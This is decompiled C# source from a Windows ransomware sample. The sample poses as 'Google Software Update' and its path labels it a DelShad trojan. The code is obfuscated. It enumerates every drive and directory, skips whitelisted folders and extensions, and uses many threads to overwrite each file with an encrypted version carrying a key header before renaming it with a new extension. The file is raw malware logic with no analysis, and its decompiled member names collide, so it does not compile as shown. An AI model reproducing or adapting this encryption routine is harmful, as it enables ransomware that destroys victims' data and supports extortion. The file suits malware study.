// Decompiled with JetBrains decompiler
// Type: C3904355907.C1812594589
// Assembly: Google Software Update, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 1ECCB2B4-E3D0-48EA-84ED-06938D43796B
// Assembly location: C:\Users\Administrateur\Downloads\toto\HEUR-Trojan.MSIL.DelShad.gen-b37761715d5a2405a3fa75abccaf6bb15b7298673aaad91a158725be3c518a87.exe

using \u003Cdion2ntty2ic0uyoe\u003E\u007B43570453\u002D3AD8\u002D4A5B\u002DB273\u002D83DF8156D820\u007D;
using System;
using System.Collections.Concurrent;
using System.Collections.Generic;
using System.IO;
using System.Runtime.InteropServices;
using System.Threading;

namespace C3904355907
{
  public sealed class C1812594589
  {
    private readonly List<string> C3554254475 = new List<string>()
    {
      DC0DFFA6\u002DD07E\u002D4569\u002D8923\u002D61FED0540CB3.iG(),
      DC0DFFA6\u002DD07E\u002D4569\u002D8923\u002D61FED0540CB3.ig(),
      DC0DFFA6\u002DD07E\u002D4569\u002D8923\u002D61FED0540CB3.iH(),
      DC0DFFA6\u002DD07E\u002D4569\u002D8923\u002D61FED0540CB3.ih(),
      DC0DFFA6\u002DD07E\u002D4569\u002D8923\u002D61FED0540CB3.iI(),
      DC0DFFA6\u002DD07E\u002D4569\u002D8923\u002D61FED0540CB3.ii(),
      DC0DFFA6\u002DD07E\u002D4569\u002D8923\u002D61FED0540CB3.iJ(),
      DC0DFFA6\u002DD07E\u002D4569\u002D8923\u002D61FED0540CB3.ij(),
      DC0DFFA6\u002DD07E\u002D4569\u002D8923\u002D61FED0540CB3.iK(),
      DC0DFFA6\u002DD07E\u002D4569\u002D8923\u002D61FED0540CB3.ik(),
      DC0DFFA6\u002DD07E\u002D4569\u002D8923\u002D61FED0540CB3.iL(),
      DC0DFFA6\u002DD07E\u002D4569\u002D8923\u002D61FED0540CB3.il(),
      DC0DFFA6\u002DD07E\u002D4569\u002D8923\u002D61FED0540CB3.iM(),
      DC0DFFA6\u002DD07E\u002D4569\u002D8923\u002D61FED0540CB3.im(),
      DC0DFFA6\u002DD07E\u002D4569\u002D8923\u002D61FED0540CB3.iN(),
      DC0DFFA6\u002DD07E\u002D4569\u002D8923\u002D61FED0540CB3.@in(),
      DC0DFFA6\u002DD07E\u002D4569\u002D8923\u002D61FED0540CB3.iO(),
      DC0DFFA6\u002DD07E\u002D4569\u002D8923\u002D61FED0540CB3.io(),
      DC0DFFA6\u002DD07E\u002D4569\u002D8923\u002D61FED0540CB3.iP(),
      DC0DFFA6\u002DD07E\u002D4569\u002D8923\u002D61FED0540CB3.ip()
    };
    private readonly List<string> C3904355907 = new List<string>()
    {
      DC0DFFA6\u002DD07E\u002D4569\u002D8923\u002D61FED0540CB3.iQ(),
      DC0DFFA6\u002DD07E\u002D4569\u002D8923\u002D61FED0540CB3.iq(),
      DC0DFFA6\u002DD07E\u002D4569\u002D8923\u002D61FED0540CB3.iR(),
      DC0DFFA6\u002DD07E\u002D4569\u002D8923\u002D61FED0540CB3.ir(),
      DC0DFFA6\u002DD07E\u002D4569\u002D8923\u002D61FED0540CB3.iS(),
      DC0DFFA6\u002DD07E\u002D4569\u002D8923\u002D61FED0540CB3.@is(),
      DC0DFFA6\u002DD07E\u002D4569\u002D8923\u002D61FED0540CB3.@if()
    };
    private ConcurrentQueue<FileInfo> C3554254475 = new ConcurrentQueue<FileInfo>();
    private List<Thread> C3554254475 = new List<Thread>();
    private bool C3554254475 = false;
    private Random C3554254475 = new Random((int) DateTime.UtcNow.Ticks);
    private static object C3554254475 = new object();

    public void C3554254475()
    {
      int num = Environment.ProcessorCount * 3;
      for (int index = 0; index < num; ++index)
      {
        Thread thread = new Thread(new ThreadStart(this.C3904355907));
        thread.IsBackground = false;
        thread.Priority = ThreadPriority.Normal;
        thread.Start();
        this.C3554254475.Add(thread);
      }
      foreach (DriveInfo drive in DriveInfo.GetDrives())
        this.C3554254475(drive);
      this.C3554254475 = true;
      foreach (Thread thread in this.C3554254475)
        thread.Join();
    }

    private void C3554254475([In] DriveInfo obj0)
    {
      if (!obj0.IsReady)
        return;
      foreach (DirectoryInfo directory in obj0.RootDirectory.GetDirectories())
      {
        if (!this.C3554254475.Contains(directory.Name.ToLower()))
          this.C3554254475(directory);
      }
    }

    private void C3554254475([In] DirectoryInfo obj0)
    {
      if (this.C3554254475.Contains(obj0.Name.ToLower()))
        return;
      try
      {
        if (obj0.FullName.Contains(DC0DFFA6\u002DD07E\u002D4569\u002D8923\u002D61FED0540CB3.ie()))
          return;
        using (StreamWriter streamWriter = File.AppendText(DC0DFFA6\u002DD07E\u002D4569\u002D8923\u002D61FED0540CB3.iF()))
          streamWriter.Write(obj0.FullName + Environment.NewLine);
        DirectoryInfo[] directories = obj0.GetDirectories();
        if (directories != null)
        {
          foreach (DirectoryInfo directoryInfo in directories)
            this.C3554254475(directoryInfo);
        }
        foreach (FileInfo file in obj0.GetFiles())
          this.C3554254475(file);
      }
      catch (Exception ex)
      {
      }
    }

    private void C3554254475([In] FileInfo obj0) => this.C3554254475.Enqueue(obj0);

    private void C3904355907()
    {
      while (!this.C3554254475 || !this.C3554254475.IsEmpty)
      {
        FileInfo result = (FileInfo) null;
        if (this.C3554254475.TryDequeue(out result))
          this.C3904355907(result);
        Thread.Sleep(this.C3554254475.Next(5, 99));
      }
    }

    private void C3904355907([In] FileInfo obj0)
    {
      Thread.Sleep(10);
      try
      {
        if (obj0.Extension == null || this.C3904355907.Contains(obj0.Extension.ToLower()) || C878818188.C3554254475(obj0))
          return;
        byte[] numArray = (byte[]) null;
        C543223747.C3554254475(obj0, ref numArray);
        using (FileStream fileStream = File.OpenWrite(obj0.FullName))
        {
          fileStream.Position = 0L;
          byte[] destinationArray1 = (byte[]) null;
          byte[] destinationArray2 = (byte[]) null;
          lock (C1812594589.C3554254475)
          {
            C3463352047.C3554254475();
            destinationArray1 = new byte[C3463352047.C1255198513.Length];
            destinationArray2 = new byte[C3463352047.C1908338681.Length];
            Array.Copy((Array) C3463352047.C1908338681, (Array) destinationArray2, C3463352047.C1908338681.Length);
            Array.Copy((Array) C3463352047.C1255198513, (Array) destinationArray1, C3463352047.C1255198513.Length);
            fileStream.Write(C3110715001.C3554254475, 0, C3110715001.C3904355907);
            fileStream.Write(C3463352047.C3554254475, 0, C3463352047.C3554254475.Length);
            fileStream.Write(C3463352047.C3904355907, 0, C3463352047.C3904355907.Length);
          }
          fileStream.Flush();
          C2181537457.C3554254475((Stream) fileStream, ref numArray, ref destinationArray1, ref destinationArray2);
          File.Move(obj0.FullName, obj0.FullName + DC0DFFA6\u002DD07E\u002D4569\u002D8923\u002D61FED0540CB3.@if());
          C878818188.C3554254475(ref destinationArray1);
          C878818188.C3554254475(ref destinationArray2);
        }
      }
      catch (Exception ex)
      {
      }
    }
  }
}
